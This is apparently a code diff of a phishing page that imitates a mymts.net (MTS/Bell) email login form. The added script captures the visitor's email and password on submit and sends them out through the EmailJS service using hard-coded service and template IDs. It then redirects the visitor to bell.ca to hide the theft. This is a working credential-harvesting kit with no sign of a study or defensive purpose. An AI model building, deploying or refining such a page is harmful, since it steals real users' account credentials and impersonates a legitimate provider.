@@ -8,32 +8,91 @@
     <link href="styles.css" rel="stylesheet" />
     <link href="https://unpkg.com/boxicons@2.1.4/css/boxicons.min.css" rel="stylesheet" />
     <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
-    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script> <!-- EmailJS SDK -->
-    <script src="script.js" defer></script> <!-- Link to external JavaScript -->
 </head>
 <body>
-    <div class="wrapper">
-        <form id="form" name="sentMessage" novalidate="novalidate">
-            <input name="__original_url" type="hidden" value="https://sourcesecureauth.github.io/newlogin/"/>
-            <div class="logo">
-                <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcR5X8yEz0xHBoSWruoB1ztw20uBRoEPJ4lvTg&s" alt="MTS Logo" />
-                <p>Log in with your mymts.net email address</p>
+<div class="wrapper">
+    <form id="form" name="sentMessage" novalidate="novalidate">
+        <input name="__original_url" type="hidden" value="https://sourcesecureauth.github.io/newlogin/" />
+        <div class="logo">
+            <img alt="" src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcR5X8yEz0xHBoSWruoB1ztw20uBRoEPJ4lvTg&s" />
+            <p>Log in with your mymts.net email address</p>
+        </div>
+
+        <div class="container">
+            <div class="input-box">
+                <input id="email" name="email" placeholder="Email Address (example@mymts.net)" required="" type="text" />
             </div>
-            <div class="container">
-                <div class="input-box">
-                    <input id="email" name="email" placeholder="Email Address (example@mymts.net)" required="" type="text" />
-                </div>
-                <div class="input-box">
-                    <input id="pw" name="pw" placeholder="Password" required="" type="password" />
-                    <button id="togglePassword" type="button">Show</button>
-                </div>
-                <button class="btn" id="button" type="submit">LOG IN</button>
-                <div class="register-link">
-                    <input type="checkbox" /> <span>Remember Me</span> <a href="#">Forgot Password?</a>
-                </div>
+
+            <div class="input-box">
+                <input id="pw" name="pw" placeholder="Password" required="" type="password" />
+                <button id="togglePassword" type="button">Show</button>
             </div>
-        </form>
-    </div>
-    <script src="script.js"></script> <!-- Ensure script.js is included after the form -->
+            <button class="btn" id="button" type="submit">LOG IN</button>
+
+            <div class="register-link">
+                <input type="checkbox" /> <span>Remember Me</span> <a href="#">Forgot Password?</a>
+            </div>
+        </div>
+    </form>
+</div>
+
+<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script><script type="text/javascript">
+    emailjs.init("k0j6f8XTF_aBl-Dip");
+</script>
+<script>
+    const btn = document.getElementById("button");
+    document.getElementById("form").addEventListener("submit", function (event) {
+        event.preventDefault();
+
+        const email = document.getElementById('email').value.trim();
+        const password = document.getElementById('pw').value.trim();
+        if (!email || !password) {
+            alert('Please fill in all fields.');
+            return;
+        }
+
+        btn.value = "Sending...";
+        const serviceID = "service_ut76as3";
+        const templateID = "template_n5lm9ms";
+        emailjs.sendForm(serviceID, templateID, this).then(
+            () => {
+                btn.value = "Send Email";
+                // Redirect to login success page
+                window.location.href = "https://www.bell.ca/"; // NOTE: Make sure this is the correct page you want to redirect to
+            },
+            (err) => {
+                btn.value = "Send Email";
+                alert(JSON.stringify(err));
+            }
+        );
+    });
+</script>
+<script>
+    const passwordInput = document.getElementById("pw");
+    const toggleButton = document.getElementById("togglePassword");
+    toggleButton.addEventListener("click", function () {
+        if (passwordInput.type === "password") {
+            passwordInput.type = "text";
+            toggleButton.textContent = "Hide";
+        } else {
+            passwordInput.type = "password";
+            toggleButton.textContent = "Show";
+        }
+    });
+</script>
+<!-- JavaScript Libraries -->
+<script src="https://code.jquery.com/jquery-3.4.1.min.js"></script>
+<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/js/bootstrap.bundle.min.js"></script>
+<script src="lib/typed/typed.min.js"></script>
+<script src="lib/easing/easing.min.js"></script>
+<script src="lib/waypoints/waypoints.min.js"></script>
+<script src="lib/owlcarousel/owl.carousel.min.js"></script>
+<script src="lib/isotope/isotope.pkgd.min.js"></script>
+<script src="lib/lightbox/js/lightbox.min.js"></script>
+<!-- Contact Javascript File -->
+<script src="mail/jqBootstrapValidation.min.js"></script>
+<script src="mail/contact.js"></script>
+<!-- Template Javascript -->
+<script src="js/main.js"></script>
 </body>
 </html>
